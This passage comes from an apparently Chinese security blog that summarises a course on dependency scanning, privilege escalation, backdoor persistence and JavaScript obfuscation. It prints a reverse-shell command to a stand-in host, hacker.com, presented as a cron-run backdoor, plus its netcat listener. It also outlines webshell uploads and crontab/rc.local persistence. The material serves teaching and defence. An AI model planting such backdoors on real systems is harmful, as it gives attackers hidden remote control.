Vulnerabilities &amp; Exposures，公共漏洞和暴露）这个公开漏洞库中，你可以根据漏洞的唯一编号，在 CVE 中快速地找到这个漏洞相关的信息，包括：受影响的版本、可能造成的影响、修复的方法及补丁等。</p><p>除了 CVE 之外，公开的漏洞库还包括CWE（Common Weakness Enumeration，通用缺陷列表）、CVSS（Common Vulnerability Scoring System，通用漏洞评分系统）、NVD（National Vulnerability Database，国家信息安全漏洞库）以及CNVD(China National Vulnerability Database，中国国家信息安全漏洞库）。</p><p>那实际工作中，我们其实也可以借助工具，自动化地完成匹配公开漏洞库的工作。OWASP Dependency-Check是一款专门进行插件漏洞检测的工具。它会将工程内的插件和公开的漏洞库进行比对。最终，会生成一个网页形式的报告，使你对工程中的插件漏洞一目了然了。下图就展示了，如何通过 OWASP Dependency-Check 发现一个 3.2.1 版本的 Commons-Collections 的高危漏洞。</p><p>同理，在其他语言中，也会存在类似的插件管理工具。比如对于 JavaScript 中的插件，我们可以使用Retire.js进行整理。</p><p>总结来说，我们在建立插件漏洞的防护体系时，会使用这些自动化管理工具完成这样三件事情：</p><ul><li>统计你的应用中引用了哪些插件</li><li>管理这些插件中是否有版本更新</li><li>检测这些插件是否存在已知的漏洞</li></ul><h2 id="权限提升和持久化"><a href="#权限提升和持久化" class="headerlink" title="权限提升和持久化"></a>权限提升和持久化</h2><h3 id="权限提升：为什么黑客能通过-SSRF-拿到服务器权限？"><a href="#权限提升：为什么黑客能通过-SSRF-拿到服务器权限？" class="headerlink" title="权限提升：为什么黑客能通过 SSRF 拿到服务器权限？"></a>权限提升：为什么黑客能通过 SSRF 拿到服务器权限？</h3><p>在应用或系统中，黑客或者被黑客控制的用户，通常会通过漏洞攻击或者利用弱密码，获取到其他用户的权限。在获取了新的用户权限之后，黑客就能够以新用户的身份去窃取和篡改数据，进行非法的操作了。这就是权限提升（Privilege Escalation）。也就是说，黑客可以通过不断获取新的身份，来不断扩大（或者叫提升）自己的权限，不断扩大攻击影响，最终实现控制整个系统。</p><p>水平提升是指黑客获取了另外一个“平级”用户的权限。尽管权限等级没变，但因为黑客控制的用户身份发生了变更，所以黑客能够获得新的数据和权限。比如，常见的普通用户被盗号就是一种水平提升。黑客本来只能够登录自己的账号，但他却通过破解密码的方式，登录到其他用户的账号，从而可以查看他人的个人信息，利用他人账号进行交易转账。</p><p>相比较来说，垂直提升的危害性更大。通过垂直越权，黑客能够获得一个更高级别的权限，通常来说，是应用的管理员或系统的 ROOT 权限。拥有高等级权限后，黑客自然就能够获取到大部分的数据了。除此之外，通过高等级的权限，黑客还能够禁用审计功能、删除相关日志，从而隐匿自己的行踪，让你无法发现攻击事件的存在。</p><p>首先，这个 SSRF 是有回显的，所有内网请求的响应都能够直接被黑客看到。所以，黑客利用.svn 文件的信息泄露，一点一点请求内网的各种地址，最终获得了一台服务器上的代码。获得代码之后，黑客通过分析，知道这个服务器存在 SQL 注入漏洞。于是，黑客通过 SQL 注入，成功在这台服务器上执行了命令。然后，黑客就开始对内网进行 SSH 扫描，最终以用户名“root”和密码“123456”，成功获得了一台内网服务器的 ROOT 权限。</p><p><img src="/images/security/security-web/18.jpg" alt="18"></p><p>事实上，几乎所有的漏洞和攻击（包括前面讲到的几个 Web 漏洞）都可能导致权限提升。总体来说，权限提升的方法可以分为下面这两种。</p><ul><li>窃取身份：前面我们讲过，身份认证的相关风险和攻击包括：无认证、弱密钥、认证信息泄露和认证环节破解等。这些攻击的最终结果其实都一样，就是黑客成功登录了他人的账号，也就意味着权限提升的发生。</li><li>利用漏洞获得权限：从行业现状来说，对于补丁管理的工作普遍做得不到位，各种有漏洞的系统和插件仍在大量使用。因此，权限提升最普遍的方法还是利用漏洞获得权限。这其中，既包括已公开的漏洞，比如上节课中提到的“脏牛”，还包括很多资深黑客所掌握的“0 day”漏洞。</li></ul><h3 id="权限持久化：为什么漏洞修复了，还有“后门”？"><a href="#权限持久化：为什么漏洞修复了，还有“后门”？" class="headerlink" title="权限持久化：为什么漏洞修复了，还有“后门”？"></a>权限持久化：为什么漏洞修复了，还有“后门”？</h3><h4 id="什么是“后门”？"><a href="#什么是“后门”？" class="headerlink" title="什么是“后门”？"></a>什么是“后门”？</h4><p>当黑客通过权限提升，成功获取到一个高级别的权限后，为了保留这个权限，黑客会在应用中留下一个隐藏的进程，下次只要黑客想再次进入，就可以通过这个进程来连通，而不需要再次去绕过各种安全流程。这就是“后门”。也就是说，“后门”能够让你在不经过正常流程的情况下，就直接获得一些权限。</p><p>比如说，黑客在进入服务器之后，会留下下面这样一个脚本，让这个脚本，每分钟都执行一次：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/hacker.com/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>这个脚本运行后，只要 hack.com 的 8080 端口打开，那么服务器就会通过 TCP 获取 8080 端口返回的命令并执行。因此，只要黑客任意时刻在 hacker.com 中监听 8080 端口（比如通过 nc -l 8080），就可以获得服务器定时送上来的命令执行权限。</p><p>所以，不管漏洞是否修复，黑客都可以通过这个快速通道轻松进入系统。而“后门”的关键意义就在于，为黑客长时间保持高权限的通道，使得黑客能够进行长时间地潜伏和攻击。</p><p>比较有意思的是，“后门”不仅仅是为黑客服务的，正常的应用中可能也会留下一些“后门”以备特殊情况。比如，2008 年，微软曾进行过一次打击盗版 Windows 的行动，当时国内的盗版 Windows 在同一时间出现了黑屏现象。显然，微软不可能知道所有人的管理员密码，但是微软会通过预留的“后门”实现对系统的控制。类似情况还有很多，比如，管理员在特殊情况下（比如忘记密码），可以通过“后门”对应用进行一些操作。</p><h4 id="“后门”是如何工作的？"><a href="#“后门”是如何工作的？" class="headerlink" title="“后门”是如何工作的？"></a>“后门”是如何工作的？</h4><p>我们前面讲过的所有攻击方式，通常都是为了造成一些显式的攻击。而“后门”的目的则不同，“后门”会尽力隐藏自己不被别人发现。因此，“后门”通常会以木马的形式出现。</p><p>所谓木马（Trojan），就是一些外表看起来正常，但会对应用和系统进行破坏的服务和进程。比如，很早之前流行过的“灰鸽子”木马，就是和正常的应用绑定在一起。这样“灰鸽子”就能在应用运行的时候监控应用的全部操作了（屏幕、键盘、摄像头等）。又因为应用正常的功能不会受到影响，所以，用户几乎感知不到“灰鸽子”的存在。</p><p>那木马可不可以不依附于应用，直接隐藏自己呢？当然可以。那么，“后门”就发展成了 Rootkit。通常来说，Rootkit 会驻扎于内核中，通过修改内核的逻辑来完成“后门”的功能。因为内核具备较高的权限，所以 Rootkit 就能破坏杀毒软件这样的安全进程，而不被轻易发现。同样地，因为 Rootkit 驻扎在内核中，理论上，除了重装系统以外，没有其他更好的方式来根除“后门”。</p><h4 id="黑客如何将“后门”植入到系统？"><a href="#黑客如何将“后门”植入到系统？" class="headerlink" title="黑客如何将“后门”植入到系统？"></a>黑客如何将“后门”植入到系统？</h4><p>最直接的方式就是通过权限提升，即黑客直接获取到系统的命令执行权限，然后通过网络将“后门”程序从云端下载下来。</p><p>除此之外，黑客还可以通过文件上传漏洞向服务器上传一个程序。在使用应用的时候，用户经常需要上传一些文件，比如：头像的图片、邮件附件和简历等。很多时候，开发人员为了方便，会直接将上传的文件存储到当前目录，也就是 Web 服务的目录中。这个时候，如果黑客上传的是一个 PHP 文件，那么这个 PHP 文件就会被放入到 Web 服务的目录中。因此，黑客只需要上传一个包含 WebShell 的 PHP 文件，就成功了植入了一个“后门”。</p><p>通过权限提升或者文件上传漏洞成功植入“后门”之后，黑客还需要保证“后门”的持久化。因此，“后门”需要常驻于系统的后台，并能够随着系统的开关机而启动。为了实现这个目的，黑客通常会在定时任务（crontab）或者开机启动项（inittab、rc.local）的配置中，加上“后门”的执行命令。</p><p>除此之外，黑客还可以利用伴随于系统的常驻进程来保证“后门”的持久化。对于 WebShell 来说，只要 Web 服务保持可用，那么 WebShell 也一直可用。对于 Rootkit 来说，它们会直接篡改内核的初始函数来进行自启动，也就更难被发现和去除。</p><p>总之，持久化要么是通过定时任务、开机启动等方式来实现，要么就是通过伴随于系统的常驻进程来实现。</p><h3 id="面对权限提升和持久化，该怎么进行防护？"><a href="#面对权限提升和持久化，该怎么进行防护？" class="headerlink" title="面对权限提升和持久化，该怎么进行防护？"></a>面对权限提升和持久化，该怎么进行防护？</h3><p>两种常见的防护方法，它们分别是：最小权限原则和 IDS。</p><p>首先，最基础的防护是从制度和技术上去落实最小权限原则。所谓最小权限原则，就是给每一个用户和进程等，只分配它们需要用到的权限。从技术实现上来说，可以通过配置一定的访问控制策略来进行强化，比如在 Linux 中给予特定进程单独的角色权限等，这部分内容我会在后续的课程中详细介绍。通过最小权限原则的落实，你就能够限制黑客在每一次权限提升时得到的收益，甚至阻断黑客权限提升的可能。</p><p>其次，就是利用 IDS（Intrusion Detection System，入侵检测系统）对黑客的异常行为进行检测。IDS 的检测原理就是，通过分析正常用户和黑客在网络层或者主机层中的行为异同，来识别黑客的攻击。比如，正常用户不会去连接内网中不相干的主机，而黑客则必须通过扫描去探测内网等。</p><p>如果黑客已经在进行权限提升和持久化的操作了，这就意味着应用和系统已经出现了各种漏洞。因此，在这个前提下，我们要考虑的不是如何去修复和避免漏洞，而是在出现漏洞后，如何降低损失并尽早发现漏洞。这其实也是安全中纵深防御的一种思想：对不同的层级进行不同的防御，即使前面层漏过了，下一层还能够接着进行防护。</p><p><img src="/images/security/security-web/19.jpg" alt="19"></p><h2 id="前端安全：如何打造一个可信的前端环境？"><a href="#前端安全：如何打造一个可信的前端环境？" class="headerlink" title="前端安全：如何打造一个可信的前端环境？"></a>前端安全：如何打造一个可信的前端环境？</h2><p>我们先来看一个攻击事件。2017 年，12306 网站被曝出有“买下铺”的功能。我们都有过买票的经历，当我们在 12306 上买卧铺的时候，是没法选择上铺、中铺还是下铺的。但是，有人去分析了 12306 的前端代码，发现里面其实包含了选铺位的功能，只是默认为随机，没有展示出来。所以，有人通过篡改前端代码，就将这个功能开放出来了。</p><p><img src="/images/security/security-web/20.jpg" alt="20"></p><p>一旦黑客能够完全摸清楚应用的前端代码，就能够任意地篡改前端的逻辑，实现带有想要功能的前端应用了。</p><p>如果说 12306 的例子，还不足以让你对前端安全产生警惕的话，你可以想一想，我们在网上看到的各种所谓的“破解版”软件，其实都是人为修改了应用的前端认证功能，从而不需要认证就可以正常使用。</p><p>除了篡改前端代码，黑客还可以通过对前后端接口的调用过程进行分析，复刻出一个自己的前端应用。在黑客复刻的前端应用中，所有的接口认证和加密都合法，只是调用的顺序完全由黑客掌控。粉丝圈比较流行的各类明星应援工具，其实都是基于这个原理实现的：黑客通过分析微博客户端的接口，自己打包了一个前端应用，实现了一键关注、点赞等功能。因为这些接口都是合法的，所以后端人员很难分辨出这些请求是来自于正规的应用，还是黑客自己实现的应用。</p><p>针对前端的攻击可以说是“防不胜防”，这让后端没有办法信任前端的环境，甚至没有办法信任前端发起的请求和上传的数据，极大地影响了公司和应用的正常发展。那么，我们应该通过什么方法来保障前端的可信呢？</p><h3 id="什么是混淆技术？"><a href="#什么是混淆技术？" class="headerlink" title="什么是混淆技术？"></a>什么是混淆技术？</h3><p>要解决这个问题，我们可以先想一下黑客攻击前端的过程：黑客通过分析前端代码，来篡改前端逻辑，实现带有想要功能的前端应用。那有没有一种方法，无法让黑客在前端代码中分析出有效信息呢？答案就是混淆。</p><p>在理想状态下，我们混淆了前端代码之后，不仅能让黑客无法篡改前端代码，还能保证即使黑客成功篡改代码，那么篡改后的前端代码依然不可用。同时，黑客无法获得前端的接口密钥和签名等信息，也就无法伪造正常的前端应用去发起请求了。</p><p>我们知道，安全中通常不存在理想状态。我们最需要做的，就是不断地升级对抗，来接近这个理想的目标。</p><p>刚才我们说的是混淆技术可以实现的结果，那混淆技术究竟是什么呢？在不同的语言和环境（如：Android 、iOS 和 Web）中，混淆技术都是相对独立的。尽管混淆技术相对独立，但我还是希望，你可以通过理解一门语言的混淆技术和思路，做到“一通百通”。我也希望能够更好地启发你去思考，如何去做好前端安全。接下来，我就以 JavaScript 为例，带你梳理混淆的常见技术和思路。</p><h4 id="清晰代码无序化"><a href="#清晰代码无序化" class="headerlink" title="清晰代码无序化"></a>清晰代码无序化</h4><p>在实际工作中，开发人员总是会要求自己写出清晰简洁的代码。但是，这也为黑客的代码分析提供了便利。因此，混淆的第一步，一定是想办法让我们的 JavaScript 代码变得“难看”，也就是将整洁的代码变得无序。</p><p>有什么办法能让代码变得“难看”呢？我这里通过一个例子来具体解释一下，你就能明白了。</p><p>我们先来看一段代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">obfuscate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"I'm obfuscator!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">obfuscate();</span><br></pre></td></tr></table></figure><p>我们一眼就能够看出这段代码的逻辑：有一个 obfucate 方法，这个方法会打出一行日志，日志内容为“I’m obfuscator!”。<br>在 JavaScript 中，空格、换行、缩进这些内容，只是为了让代码看起来更清晰。所以，这些对代码没有影响，只是便于开发人员查看的内容，完</p><p>全可以去除。这样一来，这段代码我们就可以改成下面这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">obfuscate</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>[<span class="string">'log'</span>](<span class="string">'I'</span>m obfuscator!<span class="string">');&#125;obfuscate();</span></span><br></pre></td></tr></table></figure><p>把代码压缩成一行后，黑客想要阅读就已经比较吃力。在此基础上，我们还可以让它变得更“难看”。实际上，JavaScript 中的方法名和变量名也不影响逻辑执行，只是开发人员用来表示方法和变量的含义，完全可以用没有意义的随机字符替代。随机字符代替后的效果如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_0xc648a</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>[<span class="string">'log'</span>](<span class="string">'I\x27m\x20obfuscator!'</span>);&#125;_0xc648a();</span><br></pre></td></tr></table></figure><h4 id="简单逻辑复杂化"><a href="#简单逻辑复杂化" class="headerlink" title="简单逻辑复杂化"></a>简单逻辑复杂化</h4><p>对于上面这段无序化后的代码，只要黑客稍微花点心思去阅读，再配合一些 JavaScript 格式化的工具，也能够弄明白它的逻辑。归根结底还是因为这段代码“太简单了”。那么，我们是不是能够让原本简单的代码变得复杂呢？实现方法有很多种，我们先来看最简单的一种：加入无意义的代码。</p><p>我们还是以最开始的简单代码为例。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">obfuscate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"I'm obfuscator!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">obfuscate();</span><br></pre></td></tr></table></figure><p>在这段代码中，本来输出的日志就是一个固定的字符串“I’m obfuscator!”。但是，我们可以先将这段字符串放在一个字典中，然后再通过字典去获取字符串。修改后的效果如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">obfuscate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x16df9a = &#123; <span class="string">'HXGCi'</span>: <span class="string">'I\x27m\x20obfuscator!'</span> &#125;;</span><br><span class="line">    <span class="built_in">console</span>[<span class="string">'log'</span>](_0x16df9a[<span class="string">'HXGCi'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">obfuscate();</span><br></pre></td></tr></table></figure><p>这就是通过字典等形式，将常量变成变量的混淆方法。在此基础上，我们还可以加入一些无意义的 switch、if 和 while 语句，进一步将代码复杂化。</p><p>除了加入一些无意义的代码，我们还可以加入一些不会被执行的代码，让混淆的结果更有威慑力。比如下面这段代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x2177d9, _0x1442cc</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0xb84613 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x5a2b5f</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (--_0x5a2b5f) &#123;</span><br><span class="line">            _0x2177d9[<span class="string">'push'</span>](_0x2177d9[<span class="string">'shift'</span>]());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    _0xb84613(++_0x1442cc);</span><br><span class="line">&#125;(_0x1808, <span class="number">0x1ea</span>));</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">obfuscate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>[<span class="string">'log'</span>](<span class="string">'I\x27m\x20obfuscator!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">obfuscate();</span><br></pre></td></tr></table></figure><p>在这段代码中，中间的 function (_0x2177d9, _0x1442cc) 就不会被执行，它的目的仅仅是让代码看起来更复杂而已。</p><h4 id="固定字符动态化"><a href="#固定字符动态化" class="headerlink" title="固定字符动态化"></a>固定字符动态化</h4><p>在我们前面说的这几个混淆代码的例子中，关键字符串“I’m obfuscator!”始终都存在。如果黑客关心的只是这个字符串，那它通过搜索就可以很快定位到。也就是说，通过前面几种方式混淆的前端代码，其中的接口、密钥和签名等信息，黑客还是很容易就可以获取到。</p><p>既然关键字符串“存在”于代码中就不安全，那有没有方法可以让关键字符串“消失”呢？我们可以通过加入一些逻辑，让这些关键字符串只有在实际运行的时候，才会被计算出来。</p><p>最简单、最直接的思路就是，我们可以将关键字符串改成多个字符串拼接的形式。效果如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">obfuscate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>[<span class="string">'log'</span>](<span class="string">'I\x27m\x20o'</span> + <span class="string">'bfusc'</span> + <span class="string">'ator!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">obfuscate();</span><br></pre></td></tr></table></figure><p>通过这样改写的方式，黑客就没有办法通过搜索功能，找到“I’m obfuscator!”的位置了。</p><p>但是，这种简单分割字符串的方式很容易被发现。所以，我们可以将这些字符串从它原本的位置拿出来，通过更复杂的方法（如：数组的引用、方法的调用等）来获取。效果如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x5e96 = [</span><br><span class="line">    <span class="string">'bfusc'</span>,</span><br><span class="line">    <span class="string">'ator!'</span>,</span><br><span class="line">    <span class="string">'log'</span>,</span><br><span class="line">    <span class="string">'I\x27m\x20o'</span></span><br><span class="line">];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x520fe6, _0x366376</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x38fe5f = <span class="function"><span class="keyword">function</span> (<span class="params">_0x456d44</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (--_0x456d44) &#123;</span><br><span class="line">            _0x520fe6[<span class="string">'push'</span>](_0x520fe6[<span class="string">'shift'</span>]());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    _0x38fe5f(++_0x366376);</span><br><span class="line">&#125;(_0x5e96, <span class="number">0x15e</span>));</span><br><span class="line"><span class="keyword">var</span> _0x40ca = <span class="function"><span class="keyword">function</span> (<span class="params">_0x520fe6, _0x366376</span>) </span>&#123;</span><br><span class="line">    _0x520fe6 = _0x520fe6 - <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">var</span> _0x38fe5f = _0x5e96[_0x520fe6];</span><br><span class="line">    <span class="keyword">return</span> _0x38fe5f;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">obfuscate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>[_0x40ca(<span class="string">'0x0'</span>)](_0x40ca(<span class="string">'0x1'</span>) + _0x40ca(<span class="string">'0x2'</span>) + _0x40ca(<span class="string">'0x3'</span>));</span><br><span class="line">&#125;</span><br><span class="line">obfuscate();</span><br></pre></td></tr></table></figure><p>这样一来，黑客想要快速找到 _0x40ca(‘0x1’) 具体指什么，就需要花上一番功夫了。</p><h3 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h3><p>前面 3 种技术都是直接对源码进行混淆。但是，大多数情况下，黑客在分析代码的时候，不是直接阅读源码，而是通过调试的方法在 JavaScript 代码运行过程中，获取实际的代码执行方向以及变量的值。因此，为了保护前端安全，我们要采用反调试技术。在 JavaScript 中，主要有两种方法可以对抗调试：域名锁定和无限断点。下面，我们一一来看。</p><h4 id="第一种是域名锁定"><a href="#第一种是域名锁定" class="headerlink" title="第一种是域名锁定"></a>第一种是域名锁定</h4><p>当黑客来想要分析一个网页的时候，通常会将代码下载下来放到本地运行。但是，我们更希望这个分析过程仍然发生在当前的域名下，这样我们就能够通过请求去分析黑客到底干了什么。因此，我们可以在 JavaScript 中加入一段域名判断的逻辑。这样一来，当 JavaScript 运行的环境是 localhost（本地主机）域名，或者其他未知的域名时，JavaScript 就会产生错误，黑客就无法正常运行下载后的 JavaScript 文件了。</p><p>我来举个例子。在 JavaScript 中，我们可以通过 window.location.host 获取当前域名，然后判断这个域名是否等于网站的域名，比如 server.com。如果不等于的话， 说明 JavaScript 不是通过正常访问域名的形式执行的。因此，JavaScript 会直接返回，不执行后续的逻辑。代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">obfuscate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">window</span>.location.host != <span class="string">'server.com'</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"I'm obfuscator!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">obfuscate();</span><br></pre></td></tr></table></figure><h4 id="第二种是无线断点"><a href="#第二种是无线断点" class="headerlink" title="第二种是无线断点"></a>第二种是无线断点</h4><p>在调式技术中，我们最常用到的功能就是断点。通过设置断点，我们可以让程序停留在某一个代码或者指令上，方便查看停留的这个时刻中各个变量的具体值是什么。</p><p>在 JavaScript 中，debugger 指令就是用来添加断点的。所以，在反调试的时候，我们可以在 JavaScript 中开启一个单独的线程，来循环调用 debugger。这样一来，如果黑客进入到调试模式，就会不断地停滞在无意义的断点处，从而无法正常调试。在正常运行 JavaScript 的时候，debugger 不会生效，也就不会影响用户的正常使用。</p><p>除此之外，针对提供了额外的 JavaScript 接口的浏览器（比如 Chrome），我们可以通过在 JavaScript 中检测开发者工具是否开启等特征，来实现反调试。开发者工具是开发人员在调试过程中必须使用的工具，一旦开启，基本就代表已经进入调试状态了。因此，我们可以在检测到开发者工具开启的时候，不去执行正常的 JavaScript 逻辑，这样就能够起到反调试的作用了。</p><p>好了，说完了这 4 种混淆技术，我要提醒你一点。这些混淆技术不是独立使用的，而应该是组合使用的。完整的混淆流程应该是这样的：首先，我们可以在原有的 JavaScript 代码中加入反调试的逻辑，然后通过简单逻辑复杂化和固定字符动态化的方法，隐藏原有的逻辑和反调试的逻辑。最后，通过清晰代码无序化，将所有的额外信息进行剔除，最终将代码变成了压缩成一行的 JavaScript 文件。</p><h3 id="混淆技术有什么负面影响？"><a href="#混淆技术有什么负面影响？" class="headerlink" title="混淆技术有什么负面影响？"></a>混淆技术有什么负面影响？</h3><p>尽管混淆技术是保护前端安全的重要技术，但混淆技术改变了前端代码，就不可避免会影响前端的功能。这也是混淆始终达不到理想状态的一个主要原因。对于 JavaScript 的混淆来说，它的负面影响主要包括三个方面：增加体积、影响性能和无法分析报错。</p><p>混淆带来的最直接影响就是增加代码体积。在固定字符动态化的例子中，原本简单的 4 行代码经过混淆之后，变成了几十行。如果应用更复杂一些，一个几 KB 的 JavaScript 文件经过混淆之后变成几百 KB，也是很正常的事情。这样一来，用户网络加载一个大型的 JavaScript 文件，所面对的消耗、加载时的延迟以及运行时的内存等都会有明显增长。</p><p>除了增加代码体积以外，混淆还会增加额外的执行逻辑，降低代码执行的速度影响性能。比如说，console.log 本来只是一个简单的指令，但是在混淆之后，JavaScript 需要对它进行数据的取值、索引的计算以及字符串的拼接等操作。这样一来，混淆后的代码执行速度必然会下降。</p><p>而且这些无用的操作，事实上是可以无限添加的。因此，在混淆的时候，如何把控复杂化的程度，是我们需要谨慎考量和测试的。</p><p>还有一点是不可避免的，那就是混淆后的代码，不仅黑客无法阅读，你其实也无法阅读。在混淆之前，如果前端出现错误，我们可以直接通过错误信息定位错误；但是在混淆之后，错误信息会变得“很难看”，而且代码只会剩下一行，我们也就无法定位了。</p><p>你还需要注意一点：混淆不可能让代码变得完全不可读。因为你的代码最终需要执行在用户终端，而执行的条件就是终端能够读懂代码。以 JavaScript 为例，黑客完全可以自己定义一个浏览器来执行 JavaScript 代码。这样一来，尽管黑客没办法直接阅读 JavaScript 文件，但仍然可以通过浏览器执行的指令集和内存环境来进行分析。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>极客时间《安全攻防技能30讲》</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Web 安全，是指所有基于 HTTP 或者其他超文本传输协议（RPC 等）开发的应用，包括：网页、App、API 接口等等。这类应用的共同点是：通过 HTTP 等文本协议，在客户端和服务端之间进行数据交换。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Security" scheme="https://xinlichao.cn/categories/Security/"/>
    
    
      <category term="security" scheme="https://xinlichao.cn/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>安全基础概念</title>
    <link href="https://xinlichao.cn/back-end/security/security-concepts/"/>
    <id>https://xinlichao.cn/back-end/security/security-concepts/</id>
    <published>2020-07-11T10:00:00.000Z</published>
    <updated>2021-02-26T10:23:44.682Z</updated>
    
    <content type="html"><![CDATA[<p>安全基础概念</p><a id="more"></a><h2 id="安全的本质"><a href="#安全的本质" class="headerlink" title="安全的本质"></a>安全的本质</h2><p>任何应用最本质的东西其实都是数据。用户使用产品的过程，就是在和企业进行数据交换的过程。比如，用户在使用微博时，或是将数据写入到微博（发博、评论、点赞等）中，或是从微博中获取数据（刷 feed、热门流）；用户在使用支付宝进行交易时，则是将资产以数据的形式进行转移。</p><p>安全的本质就是保护数据被合法地使用。怎么才叫“被合法地使用”呢？我们可以从机密性、完整性、可用性这 3 个方面具体来看。这也是在安全领域内最为基础的 3 个安全原则。</p><p><strong>安全原则</strong></p><p>机密性（Confidentiality）、完整性（Integrity）、可用性（Availability），我们可以简称为 CIA 三元组，是安全的基本原则。理论上来说，一个完整的安全保障体系，应该充分考虑到所有的 CIA 原则。当然，实际情况中，我们会根据企业需求，对安全在这三个方向上的投入做取舍。我们平时在评判一个企业的安全水平时，也会分别从这三个方向进行考量。</p><p><img src="/images/security/security-concepts/1.jpg" alt="1"></p><h3 id="机密性"><a href="#机密性" class="headerlink" title="机密性"></a>机密性</h3><p>机密性用一句话来说就是，确保数据只被授权的主体访问，不被任何未授权的主体访问。 简单用一个词总结就是“不可见”。</p><p>举个例子，你不会允许陌生人查看你的个人隐私信息，但你可能会允许父母、朋友查看部分信息。同样的，对于应用中的数据，比如微信的朋友圈，你可以允许好友查看三天内的数据，但不允许好友查看三天前的数据。这些都是机密性在日常生活中的表现。</p><p>机密性强调的是数据的“不可见”，但这并不代表数据是正确的。比如，将一个“True”存成了“False”，这就不是机密性要考虑的事了，而这种错误的存储，则是完整性需要考虑的事情。</p><h3 id="完整性"><a href="#完整性" class="headerlink" title="完整性"></a>完整性</h3><p>完整性就是确保数据只被授权的主体进行授权的修改，简单来说，就是“不可改”。</p><p>所谓“授权的修改”，就是对主体可进行的操作进行进一步的限制。比如，只能追加数据的主体无法执行删除的操作。以个人隐私信息为例，法律允许学校或者公司在个人档案内追加信息，但不能做任何修改。又或者说，你自己发的朋友圈，不希望被其他人进行修改。这些都是完整性的典型表现。</p><h3 id="可用性"><a href="#可用性" 